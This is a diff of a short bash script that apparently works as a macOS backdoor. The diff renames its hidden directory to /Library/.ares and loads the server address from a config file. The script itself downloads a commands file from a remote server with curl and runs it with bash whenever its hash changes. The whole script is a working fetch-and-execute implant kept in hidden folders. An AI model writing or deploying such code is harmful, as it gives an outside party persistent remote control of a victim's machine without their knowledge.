@@ -1,11 +1,11 @@
 #!/bin/bash
-SERVER=<YOURSERVER>
+source /Library/.ares/ares.conf
 
-curl -o /Library/.hidden/newcommands http://$SERVER/newcommands
+curl -o /Library/.ares/newcommands http://$SERVER/newcommands
 
-CURRENTMD5=`md5 -q /Library/.hidden/commands`
+CURRENTMD5=`md5 -q /Library/.ares/commands`
 
-NEWMD5=`md5 -q /Library/.hidden/newcommands`
+NEWMD5=`md5 -q /Library/.ares/newcommands`
 
 if [[ "$CURRENTMD5" == "$NEWMD5" ]]
 then
@@ -15,8 +15,8 @@ then
     
 else
     
-    rm -rf /Library/.hidden/commands
-    mv /Library/.hidden/newcommands /Library/.hidden/commands
-    bash /Library/.hidden/commands
+    rm -rf /Library/.ares/commands
+    mv /Library/.ares/newcommands /Library/.ares/commands
+    bash /Library/.ares/commands
     
 fi
